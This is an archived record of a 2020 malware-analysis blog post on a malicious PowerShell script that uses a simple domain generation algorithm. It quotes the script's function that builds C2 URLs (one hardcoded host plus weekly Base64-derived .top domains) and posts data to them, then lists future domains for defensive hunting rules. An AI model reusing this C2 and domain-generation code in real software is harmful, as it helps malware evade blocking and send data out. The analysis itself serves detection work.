{
    "id": "17c9a493-4da6-4df7-a457-a2f51ec2f6e9",
    "created_at": "2023-01-12T15:02:08.120326Z",
    "updated_at": "2025-03-27T02:05:22.554042Z",
    "deleted_at": null,
    "sha1_hash": "9a14ae89144cdf493d3000b6be6272f61f8fc506",
    "title": "2020-07-14 - Simple DGA Spotted in a Malicious PowerShell",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:33Z",
    "file_modification_date": "2022-05-28T15:57:33Z",
    "file_size": 94387,
    "plain_text": "# Simple DGA Spotted in a Malicious PowerShell\n\n**[blog.rootshell.be/2020/07/14/simple-dga-spotted-in-a-malicious-powershell/](https://blog.rootshell.be/2020/07/14/simple-dga-spotted-in-a-malicious-powershell/)**\n\nJuly 14, 2020\n\n## DGA (“Domain Generation Algorithm“) is a technique implemented in some malware families to defeat defenders and to make the generation of IOC’s (and their usage – example to implement black lists) more difficult. When a piece of malware has to contact a C2 server, it uses domain names or IP addresses. Once the malicious code analyzed, it’s easy to build the list of domains/IP used and to ask the network team to block access to these network resources. With a DGA, the list of domain names is generated based on some criterias and the attacker has just to register the newly generated domain to move the C2 infrastructure somewhere else… This is a great cat & mouse game!\n\n I found a malicious PowerShell script that implements a simple DGA. Here is the code:\n```\nfunction xfyucaesbv( $etdtyefbg ){\n $ubezabcvwd = \"http://bito.carlaarrabito.it/\";\n \"ge\",\"6h\",\"sp\",\"FT\",\"4H\",\"fW\",\"mP\" | %{ $ubezabcvwd += \",\"+\"http://\"+ (\n[Convert]::ToBase64String(  [System.Text.Encoding]::UTF8.GetBytes( $_+ $(Get-Date UFormat \"%y%m%V\") ) ).toLower() ) +\".top/\"; };\n $ubezabcvwd.split(\",\") | %{\n  if( !$myurlpost ) {\n   $myurlpost = $_ -replace \"=\", \"\";\n   if(!(sendpost2($etdtyefbg + \"&domen=$myurlpost\"))) {  \n    $myurlpost = $false;\n   };\n   Start-Sleep -s 5;\n  }\n };\n if( $etdtyefbg -match \"status=register\" ){\n  return \"ok\";\n } else {\n  return $myurlpost;\n }\n};\n\n The most interesting line is this one:\n\n```\n\n-----\n\n```\nPS C:\\Users\\REM> ge, 6h, sp, FT, 4H, fW, mP | %{ $ubezabcvwd + \n\",\"+\"http://\"+ ( [Convert]::ToBase64String( [System.Text.Encoding]::UTF8.GetBytes(\n$_+ $(Get-Date -UFormat \"%y%m%V\") ) ).toLower() ) +\".top/\"; };\n$ubezabcvwd.split(\",\")\nhttp://bito.carlaarrabito.it/\nhttp://z2uymda3mjk=.top/\nhttp://nmgymda3mjk=.top/\nhttp://c3aymda3mjk=.top/\nhttp://rlqymda3mjk=.top/\nhttp://negymda3mjk=.top/\nhttp://zlcymda3mjk=.top/\nhttp://bvaymda3mjk=.top/Â\n\n## The first hostname is hardcoded but others are generated by a concatenation of one string (out of the array) with a timestamp. The string is Base64 encoded and padding is removed if present. Example:\nbase64(\"ge\" + \"200729\") = \"z2uymda3mjk=\"\n\n The fact that the timestamps is based on ‘%v’ (which indicates the number of the current week (0-51) is a good indicator of a DGA. One domain will be generated every week.\n\n I tried to resolve the domain names from the list above but none of them is registered right now. I generated domains for the next two months and I’ve added them to my hunting rules:\n\n```\n\n-----\n\n```\nz2uymda4mzi.top\nnmgymda4mzi.top\nc3aymda4mzi.top\nrlqymda4mzi.top\nnegymda4mzi.top\nzlcymda4mzi.top\nbvaymda4mzi.top\nz2uymda4mzm.top\nnmgymda4mzm.top\nc3aymda4mzm.top\nrlqymda4mzm.top\nnegymda4mzm.top\nzlcymda4mzm.top\nbvaymda4mzm.top\nz2uymda4mzq.top\nnmgymda4mzq.top\nc3aymda4mzq.top\nrlqymda4mzq.top\nnegymda4mzq.top\nzlcymda4mzq.top\nbvaymda4mzq.top\nz2uymda4mzu.top\nnmgymda4mzu.top\nc3aymda4mzu.top\nrlqymda4mzu.top\nnegymda4mzu.top\nzlcymda4mzu.top\nbvaymda4mzu.top\nz2uymda5mzy.top\nnmgymda5mzy.top\nc3aymda5mzy.top\nrlqymda5mzy.top\nnegymda5mzy.top\nzlcymda5mzy.top\nbvaymda5mzy.top\nz2uymda5mzc.top\nnmgymda5mzc.top\nc3aymda5mzc.top\nrlqymda5mzc.top\nnegymda5mzc.top\nzlcymda5mzc.top\nbvaymda5mzc.top\nz2uymda5mzg.top\nnmgymda5mzg.top\nc3aymda5mzg.top\nrlqymda5mzg.top\nnegymda5mzg.top\nzlcymda5mzg.top\nbvaymda5mzg.top\nz2uymda5mzk.top\nnmgymda5mzk.top\nc3aymda5mzk.top\nrlqymda5mzk.top\nnegymda5mzk.top\n\n```\n\n-----\n\n```\nzlcymda5mzk.top\nbvaymda5mzk.top\n\n## I’ll keep an eye on them!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-14 - Simple DGA Spotted in a Malicious PowerShell.pdf"
    ],
    "report_names": [
        "2020-07-14 - Simple DGA Spotted in a Malicious PowerShell.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535728,
    "ts_updated_at": 1743041122,
    "ts_creation_date": 1653753453,
    "ts_modification_date": 1653753453,
    "files": {
        "pdf": "https://archive.orkl.eu/9a14ae89144cdf493d3000b6be6272f61f8fc506.pdf",
        "text": "https://archive.orkl.eu/9a14ae89144cdf493d3000b6be6272f61f8fc506.txt",
        "img": "https://archive.orkl.eu/9a14ae89144cdf493d3000b6be6272f61f8fc506.jpg"
    }
}